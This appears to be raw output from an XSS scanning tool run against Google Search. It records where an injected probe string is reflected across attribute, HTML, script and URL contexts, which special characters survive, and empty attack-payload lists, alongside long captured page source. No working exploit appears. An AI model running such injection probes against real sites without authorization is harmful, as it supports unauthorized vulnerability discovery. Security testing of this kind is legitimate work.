+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_z8zXLoSpjfWnDLRluSiT-9n1FvE%3D&amp;prev=https://www.google.com/search?sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26q%3D" id="safesearch" data-ved="2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQo_oBegQIARAM">
+<a href="/advanced_search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQo_oBegQIARAN">
+<meta content="0;url=/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=jH6UXuuKDqqW4-EPsrGKyAo" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.google.com/search?sitesearch=usagold.com&q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='(uvw"xyz&#39;yxz&lt;/zxy site:usagold.com' aria-label="Search" data-ved="0ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ39UDCAk">
+<div jsdata="GXYZuf;;ABi9Zs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-ikQ6icWMEiEI">
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>(uvw"xyz'yxz&lt;/zxy site:usagold.com - Google Search</title>
+<em>(uvw&quot;xyz&#39;yxz&lt;/zxy site:usagold.com</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="qJzmn9pl/6dDnsKURBQqvQ==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x223c3j45MKgooQab1y2JpUzmy-PQI\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","ikQ6icWMEiEI","r-ikQ6icWMEiEI",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['ABi9Zk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:usagold.com\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x223c3j45MKgooQab1y2JpUzmy-PQI\x22,\x22\x22,\x22kH6UXp_OF4ic4-EP8_uOsAs\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','ABi9Zo','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy site:usagold.com\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','ABi9Zs','[0,\x22inline\x22,2,2500,0,0]\n','ABi9Zw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586790032\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','ABi9Z0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztt83B5GHmukJxt7J5Y1txo1xdFQfg:1586790032584\x22,3]\n','ABi9Z4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586790032386847,104386056,3053698547]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"qJzmn9pl/6dDnsKURBQqvQ\u003d\u003d","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","iKzRxb":"#5f6368","prFQBe":"#ebebeb","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","hbfefd":"#1A73E8","WxHUzd":"true","F4ULTd":"true","gir54":"0.4","TKn0F":"20px","ZMFELd":"false","seVajd":"rgba(0,0,0,.12)","aD6AQe":"#757575","iDTSkb":"true","khoEPb":"#1a0dab","ZzVVh":"false","lVRwic":"false","klgere":"invert(1) hue-rotate(180deg)","dAFa0e":"false","PIn0Ab":"1px solid #DFE1E5","bmQ7Rb":"false","Mlljec":"false","KnXmRc":"10","VbmVYd":"true","eo8dye":"#878787","V0Bluc":"none","j9ZYRc":"true","xz9C5b":"true","BoqNoc":"20px","q7vEEb":"false","bmAEG":"#d9d9d9","OqjdAf":"true","tqmosb":"#fff","YWHUvb":"18px","a8Umdd":"rgba(153,153,153,.4)","ToXxme":"#e5e5e5","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","ENmP1c":"rgba(204,204,204,.15)","xeVOLe":"#689f38","yFVHo":"true","Na6wt":"#e1e1e1","osNyZ":"1.0","e2p8ee":"false","vhCwfc":"false","SidP2e":"rgba(248, 248, 248, 0)","PxA5sf":"rgba(0,0,0,.54)","A5tF3b":"false","EgTnfe":"true","bDOvJc":"false","wku5sd":"false","ymIfqf":"18","v44rSc":"#70757a","PuOePe":"false","tqXjO":"false","OjG6Qc":"#000","sPiebd":"false","QldWK":"6","JRGsye":"none","y519we":"true","iniaFd":"true","in3Ilb":"#222","T1V3fc":"#f4b400","AYVQWe":"20px","QSF9Ec":"","EqX55c":"652","ODgkgd":"#fff","qj36Ef":"#323232","N31mf":"false","JpB3Ue":"60","pch72b":"false","KD9WYe":"#1A73E8","kL6Xwb":"false","LACYrf":"false","UNVSy":"false","jg5SCd":"false","EJG4vf":"pointer","WnrBce":"rgba(0,0,0,.1)","Nk1Bhf":"#4285f4","srQSvc":"true","D8A8he":"true","V6eh7c":"16","p7BdKe":"true","EuCkcd":"16","sBpVac":"rgba(0,0,0,.26)","NvsKMd":"true","Tae7A":"true","rZYUef":"#f5f5f5","h29koe":"32","rsd6be":"1","VXIo7d":"8px","AYXCHc":"false","PngPbb":"rgba(0,0,0,.87)","RJegIe":"#fffff0","A2aVpb":"50","tuTJ6d":"#b8b8b8","U6xP0":"#4285f4","KdGe5c":"false","IfHuyb":"rgba(0,0,0,.54)","pPtK5":"6","BW8dtd":"rgba(248, 248, 248, 1)","IvNqzc":"true","SfSmD":"#ebebeb","voc95c":"false","MiTaT":"#1A73E8","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","eE52Jd":"#5f6368","z70S0c":"false","jIrJIf":"14","Hzi6pf":"#DFE1E5","SpZHZd":"true","VnH1Zb":"normal","JcUGee":"rgba(0,0,0,.54)","aKuscd":"#AECBFA","rX9Pnb":"16","k7G1xb":"15","ppkaeb":"0","AEMHld":"#eeeeee","RZ03Ve":"#5677fc","JVBnre":"false","hqg9c":"#1878f0","iryGqc":"2","X1bUEc":"arial,sans-serif-medium,sans-serif","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","KgXmrd":"true","xDKXr":"false","wB1JTc":"false","ZLr84e":"true","tpLZye":"#fff","umYEvb":"false","EiEfXb":"#ebebeb","xBx7Dc":"36","y1HZEd":"false","a7rhWc":"false","Rnt1Qc":"false","bXvyY":"#fff","B8Dib":"rgba(0,0,0,.87)","o9mzkf":"false","BwgO5":"16","pDiOce":"false","AwPxw":"false","owXwYb":"#f8f8f8","y2Hs7d":"false","gbf9Eb":"58","B0husb":"true","oFa0q":"#fafafa","hgWJ8c":"false","qmiCId":"true","eGDqv":"false","s6Rzec":"0 16px","S7nbec":"16","aUt4Tc":"false","pxDH4c":"#0f9d58","PYrjqe":"40","imHXAf":"true","WMBRj":"#009688","dTMnbc":"false","g635Ab":"2px","GTYTQ":"#ffeb3b","AQEr7b":"#c6c6c6","MoAfyf":"#fff","rWPbFe":"rgba(255,255,255,1)","Vdtb3d":"true","RpI44b":"#ebebeb","xFbXr":"rgba(0,102,33,1)","pLhKvc":"0","TUhOL":"#fafafa","BdVmgf":"16","XgWQKd":"true","FiZWae":"32","R9GQh":"#fff","tyCgpc":"#fff","wlwuHd":"false","o28sBd":"false","W445Dc":"20","SezQgf":"500","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","nMRhJe":"false","L6WyEf":"true","bVUXme":"25","ConpTc":"false","HWmJg":"#dcdcdc","zhBJde":"false","auaxA":"#222","cdRSXc":"false","Dc0uuf":"16","KVmtZc":"rgba(255,255,255,.3)","wFGKdc":"false","uRoR4d":"false","NIYCKf":"28","eXPt4e":"400","gjAni":"#3c4043","j0DpSe":"false","Utapxe":"-webkit-","lLCPB":"true","SATNMc":"1px solid #dfe1e5","xT28q":"false","VQfWj":"#c0c0c0","FydCC":"true","BYw9f":"false","Ym5Ycb":"false","UnFEre":"16","GzC2p":"#fff","SuQiSc":"1.3","NW4nA":"rgba(255,255,255,.7)","Vzh4p":"0px 7px 6px -5px #DFE1E5","FbN3Qc":"rgba(0,0,0,.87)","kkVYtc":"false","xvI8we":"#212121","lzJv9d":"#fff","ib0wve":"rgba(153,153,153,.2)","oyB9kf":"rgba(0,0,0,.87)","b1KZw":"#fff","kePaAc":"-4","fjc61":"false","X4DPRd":"true","kVbEH":"false","S1ZUDf":"true","zHtpPb":"false","qkXvHd":"500","iwHJId":"15","fFepd":"-15","YXGVrd":"true","n1Whrf":"false","JyBo2c":"false","LIYDac":"arial,sans-serif","FYBlgf":"false","Sgnmlc":"14px","QnH6ad":"16","Fcb4A":"#1A73E8","z1x4kc":"true","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","buGAI":"16","vIMrp":"true","FF58Bf":"true","LnZAkd":"false","AP8pqf":"rgba(0,0,0,.12)","abZ6pc":"#f9a825","K2vQjf":"#f8f8f8","o07h3e":"0 4px 5px rgba(0,0,0,.16)","mJempe":"13","WWz0vd":"false","HjM8R":"#FFF","tJ4Jdf":"11","gqXETb":"#db4437","ue6nDb":"Roboto-Medium,Roboto-Regular","fQC6Cf":"2px","QA73ad":"false","kvKIW":"false","u4NTBb":"40","fRkoq":"true","ZxI7Af":"#fafafa","hWyTvf":"false","haqSDf":"rgba(0,0,0,.54)","i7mh3e":"16","QDXUyc":"#188038","I69zkb":"rgba(204,204,204,.25)","MOPyub":"15","By1ejd":"16","rx1dvd":"#f3f3f3","X4yPd":"#1c3aa9","ekXXzb":"13px","rRLesf":"0","ruHO7c":"#dd191d","KTkDB":"false","KFdH8":"true"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","qJzmn9pl/6dDnsKURBQqvQ\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586790032386847,104386056,3053698547]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw0DtAe3X1ldGU4hnQm-IX-d\x26ust\x3d1586876432431824';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x27(uvw\x22xyz\x26#39;yxz\x26lt;/zxy site:usagold.com\x27 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 